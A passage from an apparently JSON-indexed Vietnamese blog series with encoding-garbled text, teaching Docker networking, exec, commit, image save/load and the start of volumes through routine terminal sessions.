--driver bridge network1\r8f94d7a2e8ff372c3072294dd5260bbea0d0fb2692c2bedc3acad080b07b229c\r‚ùØ docker network ls\rNETWORK ID NAME DRIVER SCOPE\r286d5161c9f6 bridge bridge local\r0f2ab02aa9f4 host host local\r6c224f5d1a98 mynetwork bridge local\r8f94d7a2e8ff network1 bridge local\r271997adaaa9 none null local\r  Ch√∫ng ta ti·∫øn h√†nh t·∫°o m·ªôt s·ªë container kh√¥ng k·∫øt n·ªëi m·∫∑c ƒë·ªãnh v√†o network bridge m√† s·∫Ω k·∫øt n·ªëi v√†o mynetwork c·ªßa ch√∫ng ta.\n1 2  ‚ùØ docker run -it --name B3 --network mynetwork busybox\r/ #   ƒê·ªÉ ch·ªâ ƒë·ªãnh network khi t·∫°o, ta th√™m t√πy ch·ªçn --network v√† theo sau l√† t√™n c·ªßa network m√¨nh mu·ªën k·∫øt n·ªëi t·ªõi. Ch√∫ng ta ki·ªÉm tra xem B3 c√≥ th·∫≠t s·ª± ƒë√£ k·∫øt n·ªëi t·ªõi mynetwork ch∆∞a.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  ‚ùØ docker network inspect mynetwork\r[\r{\r\u0026#34;Name\u0026#34;: \u0026#34;mynetwork\u0026#34;,\r\u0026#34;Id\u0026#34;: \u0026#34;6c224f5d1a9819ba01d68ed6cd3a15357709d3b8dcf0b1ab0e289d11973f43d0\u0026#34;,\r\u0026#34;Created\u0026#34;: \u0026#34;2021-06-10T07:59:52.392658153+07:00\u0026#34;,\r\u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;,\r\u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;,\r\u0026#34;EnableIPv6\u0026#34;: false,\r\u0026#34;IPAM\u0026#34;: {\r\u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;,\r\u0026#34;Options\u0026#34;: {},\r\u0026#34;Config\u0026#34;: [\r{\r\u0026#34;Subnet\u0026#34;: \u0026#34;172.20.0.0/16\u0026#34;,\r\u0026#34;Gateway\u0026#34;: \u0026#34;172.20.0.1\u0026#34;\r}\r]\r},\r\u0026#34;Internal\u0026#34;: false,\r\u0026#34;Attachable\u0026#34;: false,\r\u0026#34;Ingress\u0026#34;: false,\r\u0026#34;ConfigFrom\u0026#34;: {\r\u0026#34;Network\u0026#34;: \u0026#34;\u0026#34;\r},\r\u0026#34;ConfigOnly\u0026#34;: false,\r\u0026#34;Containers\u0026#34;: {\r\u0026#34;a7231f2ebe678e679ff063d0d8a09613a81db899ffb7e11eb6ba6c202e2e97d7\u0026#34;: {\r\u0026#34;Name\u0026#34;: \u0026#34;B3\u0026#34;,\r\u0026#34;EndpointID\u0026#34;: \u0026#34;d8f6cf60953a1ebd7c1a84a95e5503bc726a5e77df2c939e8072fe6ca7406d65\u0026#34;,\r\u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:14:00:02\u0026#34;,\r\u0026#34;IPv4Address\u0026#34;: \u0026#34;172.20.0.2/16\u0026#34;,\r\u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34;\r}\r},\r\u0026#34;Options\u0026#34;: {},\r\u0026#34;Labels\u0026#34;: {}\r}\r]\r  R√µ r√†ng ·ªü tr∆∞·ªùng container ƒë√£ th√™m m·ªôt container l√† B3 v·ªõi ƒë·ªãa ch·ªâ l√† 172.20.0.2. Ch√∫ng ta ti·∫øp t·ª•c t·∫°o th√™m m·ªôt container B4 k·∫øt n·ªëi v·ªõi mynetwork v√† ch·ªâ ƒë·ªãnh c·ªïng 80 c·ªßa n√≥ √°nh x·∫° t·ªõi c·ªïng 9999 tr√™n m√°y host.\n1 2 3 4 5 6 7 8  ‚ùØ docker run -it --name B4 --network mynetwork -p 9999:80 busybox\r/ # % ‚ùØ docker ps\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\r1b39318c8d5b busybox \u0026#34;sh\u0026#34; About a minute ago Up About a minute 0.0.0.0:9999-\u0026gt;80/tcp B4\ra7231f2ebe67 busybox \u0026#34;sh\u0026#34; 5 minutes ago Up 5 minutes B3\rbdd19faad9cf busybox \u0026#34;sh\u0026#34; 37 minutes ago Up 37 minutes 0.0.0.0:8888-\u0026gt;80/tcp B2\r2f6dd1dda04d busybox \u0026#34;sh\u0026#34; 9 hours ago Up 3 seconds B1\r  Nh∆∞ v·∫≠y, tr√™n m√°y c·ªßa ch√∫ng ta ƒëang 2 m·∫°ng l√† bridge v√† mynetwork:\n M·∫°ng bridge c√≥ 2 container ƒëang k·∫øt n·ªëi t·ªõi l√† B1 v√† B2, trong ƒë√≥ B2 ƒëang √°nh x·∫° c·ªïng 80 ƒë·∫øn c·ªïng 8888 tr√™n m√°y host. M·∫°ng mynetwork c√≥ 2 container ƒëang k·∫øt n·ªëi t·ªõi l√† B3 v√† B4, trong ƒë√≥ B4 ƒëang √°nh x·∫° c·ªïng 80 ƒë·∫øn c·ªïng 9999 tr√™n host.\nTa ti·∫øn h√†nh ch·∫°y web server http tr√™n container B4 v√† k·∫øt n·ªëi t·ª´ m·∫°ng b√™n ngo√†i host.\nKhi t·∫°o ra 2 network th√¨ nh·ªØng m√°y c√πng 1 network (B1 v·ªõi B2 ho·∫∑c B3 v·ªõi B4) c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c nhau, tuy nhi√™n ·ªü kh√°c network (B1 v·ªõi B3,B4 ho·∫∑c B2 v·ªõi B3,B4) th√¨ kh√¥ng th·ªÉ th·∫•y nhau. Ch√∫ng ta c√≥ th·ªÉ ki·ªÉm tra ƒëi·ªÅu n√†y th√¥ng qua l√™nh ping, t·ª´ B1 ƒë·∫øn B2 v√† B1 ƒë·∫øn B3. D√πng l·ªánh docker network inspect \u0026lt;ten_network\u0026gt; ta bi·∫øt ƒë∆∞·ª£c ip c·ªßa B1, B2, B3 l·∫ßn l∆∞·ª£t l√† 172.17.0.3, 172.17.0.2, 172.20.0.2. V√†o B1 v√† ti·∫øn h√†nh ping qua B2, B3:  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ‚ùØ docker attach B1\r/ # ping 172.17.0.2\rPING 172.17.0.2 (172.17.0.2): 56 data bytes\r64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.268 ms\r64 bytes from 172.17.0.2: seq=1 ttl=64 time=0.101 ms\r64 bytes from 172.17.0.2: seq=2 ttl=64 time=0.198 ms\r64 bytes from 172.17.0.2: seq=3 ttl=64 time=0.162 ms\r64 bytes from 172.17.0.2: seq=4 ttl=64 time=0.165 ms\r64 bytes from 172.17.0.2: seq=5 ttl=64 time=0.164 ms\r64 bytes from 172.17.0.2: seq=6 ttl=64 time=0.139 ms\r64 bytes from 172.17.0.2: seq=7 ttl=64 time=0.160 ms\r64 bytes from 172.17.0.2: seq=8 ttl=64 time=0.181 ms\r^C\r--- 172.17.0.2 ping statistics ---\r9 packets transmitted, 9 packets received, 0% packet loss\rround-trip min/avg/max = 0.101/0.170/0.268 ms\r/ # ping 172.20.0.2\rPING 172.20.0.2 (172.20.0.2): 56 data bytes\r^C --- 172.20.0.2 ping statistics ---\r25 packets transmitted, 0 packets received, 100% packet loss\r/ #   √Ånh x·∫° c·ªïng cho m·ªôt container ƒëang ch·∫°y. Trong v√≠ d·ª• tr√™n, B3 ƒëang k·∫øt n·ªëi t·ªõi mynetwork, ta mu·ªën cho B3 k·∫øt n·ªëi th·∫≥ng t·ªõi network bridge, ta l√†m nh∆∞ sau:\ndocker network connect \u0026lt;ten_mang_muon_ket_noi\u0026gt; \u0026lt;ten_container\u0026gt;\n1  ‚ùØ docker network connect bridge B3\r  Ki·ªÉm tra m·∫°ng bridge ƒë·ªÉ xem B3 ƒë√£ th·ª±c s·ª± k·∫øt n·ªëi ch∆∞a:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  ‚ùØ docker network inspect bridge\r[\r{\r\u0026#34;Name\u0026#34;: \u0026#34;bridge\u0026#34;,\r\u0026#34;Id\u0026#34;: \u0026#34;286d5161c9f65235af68d99040f31b167b4bf23f9803fa3a2b3bd7de61b7c81c\u0026#34;,\r\u0026#34;Created\u0026#34;: \u0026#34;2021-06-10T06:58:33.069522692+07:00\u0026#34;,\r\u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;,\r\u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;,\r\u0026#34;EnableIPv6\u0026#34;: false,\r\u0026#34;IPAM\u0026#34;: {\r\u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;,\r\u0026#34;Options\u0026#34;: null,\r\u0026#34;Config\u0026#34;: [\r{\r\u0026#34;Subnet\u0026#34;: \u0026#34;172.17.0.0/16\u0026#34;,\r\u0026#34;Gateway\u0026#34;: \u0026#34;172.17.0.1\u0026#34;\r}\r]\r},\r\u0026#34;Internal\u0026#34;: false,\r\u0026#34;Attachable\u0026#34;: false,\r\u0026#34;Ingress\u0026#34;: false,\r\u0026#34;ConfigFrom\u0026#34;: {\r\u0026#34;Network\u0026#34;: \u0026#34;\u0026#34;\r},\r\u0026#34;ConfigOnly\u0026#34;: false,\r\u0026#34;Containers\u0026#34;: {\r\u0026#34;2f6dd1dda04d0ab42434a6cff6f9c7eb42474f81acdf32809486f8fa82be8951\u0026#34;: {\r\u0026#34;Name\u0026#34;: \u0026#34;B1\u0026#34;,\r\u0026#34;EndpointID\u0026#34;: \u0026#34;5ddc6f87b486401bd0e2cfea3e1c8324300f9045712778f1c321e35349c56cff\u0026#34;,\r\u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:03\u0026#34;,\r\u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.3/16\u0026#34;,\r\u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34;\r},\r\u0026#34;a7231f2ebe678e679ff063d0d8a09613a81db899ffb7e11eb6ba6c202e2e97d7\u0026#34;: {\r\u0026#34;Name\u0026#34;: \u0026#34;B3\u0026#34;,\r\u0026#34;EndpointID\u0026#34;: \u0026#34;f1c96c1089fbe206c52832089be7b18321aeea7abff840f5169d3d171fa5ca1d\u0026#34;,\r\u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:04\u0026#34;,\r\u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.4/16\u0026#34;,\r\u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34;\r},\r\u0026#34;bdd19faad9cfe6ba9f49a532cf245b3a1bec95d8d20688f4c6b52018d45538b2\u0026#34;: {\r\u0026#34;Name\u0026#34;: \u0026#34;B2\u0026#34;,\r\u0026#34;EndpointID\u0026#34;: \u0026#34;32f69c565c649791c9f70db3a7a224e6a8d882b41fb9dc7c6477d4f33b9ec32b\u0026#34;,\r\u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:02\u0026#34;,\r\u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.2/16\u0026#34;,\r\u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34;\r}\r},\r\u0026#34;Options\u0026#34;: {\r\u0026#34;com.docker.network.bridge.default_bridge\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;com.docker.network.bridge.enable_icc\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;com.docker.network.bridge.enable_ip_masquerade\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;com.docker.network.bridge.host_binding_ipv4\u0026#34;: \u0026#34;0.0.0.0\u0026#34;,\r\u0026#34;com.docker.network.bridge.name\u0026#34;: \u0026#34;docker0\u0026#34;,\r\u0026#34;com.docker.network.driver.mtu\u0026#34;: \u0026#34;1500\u0026#34;\r},\r\u0026#34;Labels\u0026#34;: {}\r}\r]\r  Trong tr∆∞·ªùng container ƒë√£ c√≥ th√™m container B3, v√† ki·ªÉm tra network mynetwork th√¨ th·∫•y B3 v·∫´n ƒëang k·∫øt n·ªëi t·ªõi mynetwork.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  ‚ùØ docker network inspect mynetwork\r[\r{\r\u0026#34;Name\u0026#34;: \u0026#34;mynetwork\u0026#34;,\r\u0026#34;Id\u0026#34;: \u0026#34;6c224f5d1a9819ba01d68ed6cd3a15357709d3b8dcf0b1ab0e289d11973f43d0\u0026#34;,\r\u0026#34;Created\u0026#34;: \u0026#34;2021-06-10T07:59:52.392658153+07:00\u0026#34;,\r\u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;,\r\u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;,\r\u0026#34;EnableIPv6\u0026#34;: false,\r\u0026#34;IPAM\u0026#34;: {\r\u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;,\r\u0026#34;Options\u0026#34;: {},\r\u0026#34;Config\u0026#34;: [\r{\r\u0026#34;Subnet\u0026#34;: \u0026#34;172.20.0.0/16\u0026#34;,\r\u0026#34;Gateway\u0026#34;: \u0026#34;172.20.0.1\u0026#34;\r}\r]\r},\r\u0026#34;Internal\u0026#34;: false,\r\u0026#34;Attachable\u0026#34;: false,\r\u0026#34;Ingress\u0026#34;: false,\r\u0026#34;ConfigFrom\u0026#34;: {\r\u0026#34;Network\u0026#34;: \u0026#34;\u0026#34;\r},\r\u0026#34;ConfigOnly\u0026#34;: false,\r\u0026#34;Containers\u0026#34;: {\r\u0026#34;1b39318c8d5b92261c22321f765945b85231160b53a9a3933b5fe120db80e7c2\u0026#34;: {\r\u0026#34;Name\u0026#34;: \u0026#34;B4\u0026#34;,\r\u0026#34;EndpointID\u0026#34;: \u0026#34;5f26179cc819ffe9f6089c8de41cc236a36ce90c5ac646041d99de7d4a54d3e5\u0026#34;,\r\u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:14:00:03\u0026#34;,\r\u0026#34;IPv4Address\u0026#34;: \u0026#34;172.20.0.3/16\u0026#34;,\r\u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34;\r},\r\u0026#34;a7231f2ebe678e679ff063d0d8a09613a81db899ffb7e11eb6ba6c202e2e97d7\u0026#34;: {\r\u0026#34;Name\u0026#34;: \u0026#34;B3\u0026#34;,\r\u0026#34;EndpointID\u0026#34;: \u0026#34;d8f6cf60953a1ebd7c1a84a95e5503bc726a5e77df2c939e8072fe6ca7406d65\u0026#34;,\r\u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:14:00:02\u0026#34;,\r\u0026#34;IPv4Address\u0026#34;: \u0026#34;172.20.0.2/16\u0026#34;,\r\u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34;\r}\r},\r\u0026#34;Options\u0026#34;: {},\r\u0026#34;Labels\u0026#34;: {}\r}\r]\r  L√∫c n√†y, B3 c√≥ th·ªÉ k·∫øt n·ªëi t·ªõi B2 v√† B1 v√† ng∆∞·ª£c l·∫°i.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  ‚ùØ docker attach B1\r/ # ping 173.20.0.2\rPING 173.20.0.2 (173.20.0.2): 56 data bytes\r64 bytes from 173.20.0.2: seq=0 ttl=49 time=325.730 ms\r64 bytes from 173.20.0.2: seq=1 ttl=49 time=297.840 ms\r64 bytes from 173.20.0.2: seq=2 ttl=49 time=280.704 ms\r64 bytes from 173.20.0.2: seq=3 ttl=49 time=328.708 ms\r64 bytes from 173.20.0.2: seq=4 ttl=49 time=274.586 ms\r64 bytes from 173.20.0.2: seq=5 ttl=49 time=295.232 ms\r64 bytes from 173.20.0.2: seq=6 ttl=49 time=274.058 ms\r^C\r--- 173.20.0.2 ping statistics ---\r8 packets transmitted, 7 packets received, 12% packet loss\rround-trip min/avg/max = 274.058/296.694/328.708 ms\r  M·ªôt l∆∞u √Ω l√† khi B3 v√† B4 c√πng k·∫øt n·ªëi v·ªõi nhau qua m·ªôt m·∫°ng, b√™n c·∫°nh k·∫øt n·ªëi v·ªõi nhau qua ƒë·ªãa ch·ªâ th√¨ ch√∫ng c√≥ th·ªÉ k·∫øt n·ªëi v·ªõi nhau qua t√™n.\n1 2 3 4 5 6 7 8 9 10 11  ‚ùØ docker attach B3\r/ # ping B4\rPING B4 (172.20.0.3): 56 data bytes\r64 bytes from 172.20.0.3: seq=0 ttl=64 time=0.283 ms\r64 bytes from 172.20.0.3: seq=1 ttl=64 time=0.194 ms\r64 bytes from 172.20.0.3: seq=2 ttl=64 time=0.164 ms\r64 bytes from 172.20.0.3: seq=3 ttl=64 time=0.191 ms\r^C\r--- B4 ping statistics ---\r4 packets transmitted, 4 packets received, 0% packet loss\rround-trip min/avg/max = 0.164/0.208/0.283 ms\r  Tuy nhi√™n B1, B2 c≈©ng k·∫øt n·ªëi v·ªõi nhau chung 1 m·∫°ng m√† ch√∫ng kh√¥ng th·ªÉ giao ti·∫øp v·ªõi nhau qua t√™n. C√≥ th·ªÉ do m·∫°ng c·ªßa ch√∫ng c√πng k·∫øt n·ªëi l√† m·∫°ng m·∫∑c ƒë·ªãnh (bridge).\n1 2 3  ‚ùØ docker attach B1\r/ # ping B2\rping: bad address \u0026#39;B2\u0026#39;\r  X√≥a m·∫°ng Khi kh√¥ng c√≥ nhu c·∫ßu s·ª≠ d·ª•ng network n·ªØa, ch√∫ng ta c√≥ th·ªÉ x√≥a ch√∫ng ƒëi v·ªõi c√∫ ph√°p:\ndocker network rm \u0026lt;ten_network\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  ‚ùØ docker network ls\rNETWORK ID NAME DRIVER SCOPE\r286d5161c9f6 bridge bridge local\r0f2ab02aa9f4 host host local\r2f8c72e77060 mynetwork bridge local\r258acbefb858 network1 bridge local\r271997adaaa9 none null local\r‚ùØ docker network rm network1\rnetwork1\r‚ùØ docker network ls\rNETWORK ID NAME DRIVER SCOPE\r286d5161c9f6 bridge bridge local\r0f2ab02aa9f4 host host local\r2f8c72e77060 mynetwork bridge local\r271997adaaa9 none null local\r  K·∫øt lu·∫≠n Trong b√†i h·ªçc n√†y, ch√∫ng ta ƒë√£ h·ªçc ƒë∆∞·ª£c t·ª´ anh XuanThuLabChanel nh·ªØng ki·∫øn th·ª©c nh∆∞ sau:\n Bi·∫øt v·ªÅ busybox C√°c l·ªánh thao t√°c v·ªõi docker network: li·ªát k√™, ki·ªÉm tra th√¥ng tin m·∫°ng M·∫°ng bridge, t·∫°o th√™m, x√≥a m·∫°ng, √°nh x·∫° c·ªïng m·∫°ng trong docker.  K·∫øt th√∫c b√†i vi·∫øt n√†y, m·ªôt l·∫ßn n·ªØa em xin ch√¢n th√†nh g·ª≠i l·ªùi c·∫£m ∆°n ƒë·∫øn anh XuanThuLabChanel ƒë√£ l√†m nh·ªØng b√†i h·ªçc qu√Ω gi√° v√† b·ªï √≠ch n√†y.\n","description":"Ph·∫ßn n√†y ch√∫ng ta s·∫Ω h·ªçc v·ªÅ : M·∫°ng | Networking trong Docker, t·∫°o v√† qu·∫£n l√Ω network trong container Docker ","id":14,"section":"posts","tags":["Docker"],"title":"T√¨m hi·ªÉu v√† s·ª≠ d·ª•ng docker (P3)","uri":"https://minhlongmt183.github.io/posts/docker_p3/"},{"content":"To√†n b·ªô series n√†y ƒë∆∞·ª£c tham kh·∫£o t·ª´ hai ngu·ªìn ch√≠nh: XuanThuLabChanel v√† DockerDoc. Em xin ch√¢n th√†nh c·∫£m ∆°n s·ª± c·ªëng hi·∫øn c·ªßa c√°c t√°c gi·∫£ c·ªßa nh·ªØng k√™nh n√≥i tr√™n.‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏è\r L·ªánh Docker exec, l∆∞u container th√†nh image v·ªõi commit, xu·∫•t image ra file Docker exec Th√¥ng th∆∞·ªùng, ƒë·ªÉ th·ª±c thi m·ªôt l·ªánh trong container, ta s·∫Ω v√†o container b·∫±ng l·ªánh docker attach \u0026lt;container name or id\u0026gt;. Tuy nhi√™n, n·∫øu ta ƒëang ·ªü host v√† v·∫´n mu·ªën th·ª±c thi m·ªôt l·ªánh b√™n trong container ƒëang ch·∫°y, ta s·∫Ω d√πng l·ªánh docker exec \u0026lt;container id / name\u0026gt; [COMMAND].\nV√≠ d·ª•, t·ª´ host, ta ch·∫°y l·ªánh ls ƒë·ªÉ li·ªát k√™ t·∫•t c·∫£ c√°c file trong container.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  ‚ùØ docker ps\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\r6d1aa3dda644 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 3 minutes ago Up 3 minutes test\r‚ùØ docker exec test ls\rbin\rboot\rdev\retc\rhome\rlib\rlib32\rlib64\rlibx32\rmedia\rmnt\ropt\rproc\rroot\rrun\rsbin\rsrv\rsys\rtmp\rusr\rvar\r  Ngo√†i ra c≈©ng v·∫´n c√≥ th·ªÉ th√™m c√°c option, v√≠ d·ª•:\n1 2  ‚ùØ docker exec -it test bash\rroot@ubuntu1:/#   L·ªánh tr√™n y√™u c·∫ßu th·ª±c thi l·ªánh bash v√† th√™m option -it ƒë·ªÉ c√≥ th·ªÉ t∆∞∆°ng t√°c tr·ª±c ti·∫øp v·ªõi terminal, d·ªÖ d√†ng th·∫•y, n√≥ kh√° gi·ªëng v·ªõi l·ªánh docker attach, tuy nhi√™n, khi m·ªü c√°c process trong container b·∫±ng htop, ch√∫ng ta s·∫Ω th·∫•y nh∆∞ sau:\nR√µ r√†ng, ·ªü ƒë√¢y c√≥ ngo√†i process /bin/bash c√≥ khi t·∫°o, container c√≤n ch·∫°y th√™m m·ªôt process bash, process n√†y ch√≠nh l√† l·ªánh m√† ch√∫ng ta y√™u c·∫ßu th·ª±c thi t·ª´ m√°y host. Sau khi th·ª±c hi·ªán l·ªánh docker exec -it test bash, ta g√µ l·ªánh exit ƒë·ªÉ tho√°t kh·ªèi container, tuy nhi√™n, v√¨ container v·∫´n c√≤n process /bin/bash n√™n n√≥ v·∫´n c√≤n ho·∫°t ƒë·ªông ch·ª© kh√¥ng b·ªã t·∫Øt ƒëi.\nDocker commit Sau khi c√†i docker v√† s·ª≠ d·ª•ng, ch√∫ng ta c√≥ th·ªÉ ph·∫£i c√†i th√™m nhi·ªÅu ph·∫ßn m·ªÅm, m√¥i tr∆∞·ªùng kh√°c nhau. Khi ƒë√≥, ƒë·ªÉ chia s·∫ª container n√†y ƒëi, ta c·∫ßn l∆∞u container n√†y th√†nh image. ƒê·ªÉ l√†m vi·ªác ƒë√≥, ta s·ª≠ d·ª•ng l·ªánh container commit.\nTr∆∞·ªõc khi l∆∞u container tr·ªü th√†nh image, ta ki·ªÉm tra xem trong h·ªá th·ªëng c√≥ nh·ªØng image n√†o:\n1 2 3 4  ‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB\rcentos latest 300e315adb2f 6 months ago 209MB\r  M·ªôt ƒëi·ªÅu l∆∞u √Ω, mu·ªën l∆∞u container th√†nh image, th√¨ container ƒë√≥ ph·∫£i ·ªü tr·∫°ng th√°i d·ª´ng (Exited).\n1 2 3 4  ‚ùØ docker ps -a\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\r6d1aa3dda644 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 23 minutes ago Exited (0) 4 minutes ago test\rddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 16 hours ago Exited (0) 16 hours ago centos_docker\r  Ti·∫øn h√†nh l∆∞u container th√†nh images, ta d√πng c√∫ ph√°p: docker commit CONTAINER image:tag. CONTAINER ·ªü ƒë√¢y l√† t√™n ho·∫∑c id c·ªßa container.\nV√≠ d·ª•, container ubuntu v·ª´a r·ªìi t√¥i ƒë√£ c√†i th√™m ping v·ªõi vim, b√¢y gi·ªù l∆∞u l·∫°i th√†nh image, ta th·ª±c hi·ªán:\n1 2 3 4 5 6 7  ‚ùØ docker commit test ubuntu-pv:version1\rsha256:a8e04dcf8737519e456dcedd646983a5d69d97ea85f5e3517b537b2b1a86ef0a\r‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rubuntu-pv version1 a8e04dcf8737 5 seconds ago 170MB\rubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB\rcentos latest 300e315adb2f 6 months ago 209MB\r  R√µ r√†ng, sau khi th·ª±c hi·ªán l·ªánh tr√™n, ch√∫ng ta s·∫Ω th·∫•y trong danh s√°ch c√°c images c√≥ th·ªÉm m·ªôt image c√≥ th√™n l√† ubuntu-py v·ªõi TAG l√† version1 c√πng ID v√† c√°c th√¥ng tin kh√°c.\nDocker save Sau khi ta l∆∞u container th√†nh m·ªôt image, ƒë·ªÉ c√≥ th·ªÉ chia s·∫ª image n√†y v·ªõi ng∆∞·ªùi kh√°c, ta l∆∞u image th√†nh m·ªôt file tr√™n m√°y host. Vi·ªác n√†y s·∫Ω ƒë∆∞·ª£c th·ª±c hi·ªán th√¥ng qua l·ªánh docker save --output filename.tar \u0026lt;image_id/name\u0026gt;.\n1 2 3 4 5 6 7 8 9 10  ‚ùØ ls\r\u0026#39;IDA Freeware.desktop\u0026#39; PinImage tmp\r‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rubuntu-pv version1 a8e04dcf8737 6 minutes ago 170MB\rubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB\rcentos latest 300e315adb2f 6 months ago 209MB\r‚ùØ docker save --output ubuntu-pv.tar a8\r‚ùØ ls\r\u0026#39;IDA Freeware.desktop\u0026#39; PinImage tmp ubuntu-pv.tar\r  V√≠ d·ª• tr√™n t√¥i ƒë√£ l∆∞u ubuntu-pv image th√†nh ra file ubuntu-pv.tar.\nDocker load Sau khi nh·∫≠n ƒë∆∞·ª£c file image.tar, ƒë·ªÉ ph·ª•c h·ªìi ho·∫∑c s·ª≠ d·ª•ng l·∫°i, ta s·ª≠ d·ª•ng l·ªánh docker load -i image.tar\nV√≠ d·ª•, t√¥i ti·∫øn h√†nh x√≥a ƒëi ubuntu-pv image hi·ªán c√≥ tr√™n h·ªá th·ªëng. L·ªánh thao t√°c v·ªõi image b·∫°n c√≥ th·ªÉ xem ·ªü P1.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  ‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rubuntu-pv version1 a8e04dcf8737 11 minutes ago 170MB\rubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB\rcentos latest 300e315adb2f 6 months ago 209MB\r‚ùØ docker image rm -f ubuntu-pv:version1\rUntagged: ubuntu-pv:version1\rDeleted: sha256:a8e04dcf8737519e456dcedd646983a5d69d97ea85f5e3517b537b2b1a86ef0a\r‚ùØ docker image rm ubuntu:latest\rUntagged: ubuntu:latest\rUntagged: ubuntu@sha256:adf73ca014822ad8237623d388cedf4d5346aa72c270c5acc01431cc93e18e2d\rDeleted: sha256:7e0aa2d69a153215c790488ed1fcec162015e973e49962d438e18249d16fa9bd\r‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rcentos latest 300e315adb2f 6 months ago 209MB\r  B√¢y gi·ªù, ta ti·∫øn h√†nh ph·ª•c h·ªìi ubuntu-pv image t·ª´ file ubuntu-pv.tar ƒë√£ c√≥ ·ªü tr∆∞·ªõc ƒë√≥.\n1 2 3 4 5 6 7 8  ‚ùØ ls\r\u0026#39;IDA Freeware.desktop\u0026#39; PinImage tmp ubuntu-pv.tar\r‚ùØ docker load -i ubuntu-pv.tar\rLoaded image ID: sha256:a8e04dcf8737519e456dcedd646983a5d69d97ea85f5e3517b537b2b1a86ef0a\r‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\r\u0026lt;none\u0026gt; \u0026lt;none\u0026gt; a8e04dcf8737 14 minutes ago 170MB\rcentos latest 300e315adb2f 6 months ago 209MB\r  Khi ph·ª•c h·ªìi, t√™n c·ªßa image v√† tag c·ªßa n√≥ s·∫Ω l√† \u0026lt;none\u0026gt;. ƒê·ªÉ ƒë·∫∑t t√™n v√† tag, ta d√πng l·ªánh:\ndocker tag image_id name:tag.\n‚ùØ docker tag a8 newimage:version2\r‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rnewimage version2 a8e04dcf8737 16 minutes ago 170MB\rcentos latest 300e315adb2f 6 months ago 209MB\rChia s·∫ª d·ªØ li·ªáu trong Docker, t·∫°o v√† qu·∫£n l√Ω ·ªï ƒëƒ©a docker volume Chia s·∫ª d·ªØ li·ªáu gi·ªØa m√°y host v√† container Tr√™n m√°y host, t√¥i t·ªï ch·ª©c c√¢y th·ª±c m·ª•c nh∆∞ sau:\n1 2 3 4 5  .\r‚îú‚îÄ‚îÄ docker\r‚îÇ¬†‚îî‚îÄ‚îÄ data\r‚îÇ¬†‚îî‚îÄ‚îÄ d.txt\r  M·ª•c ti√™u c·ªßa ch√∫ng ta l√† ƒë·ªÉ container c√≥ th·ªÉ truy c·∫≠p v√† thao t√°c v·ªõi d·ªØ li·ªáu ·ªü trong data, v√† khi container b·ªã x√≥a ƒëi, d·ªØ li·ªáu kh√¥ng b·ªã m·∫•t.\nCh√∫ng ta t·∫°o m·ªõi m·ªôt container v√† trong l√∫c t·∫°o s·∫Ω ch·ªâ r√µ th·ª±c m·ª•c √°nh x·∫° tr√™n host v√† th·ª±c m·ª•c 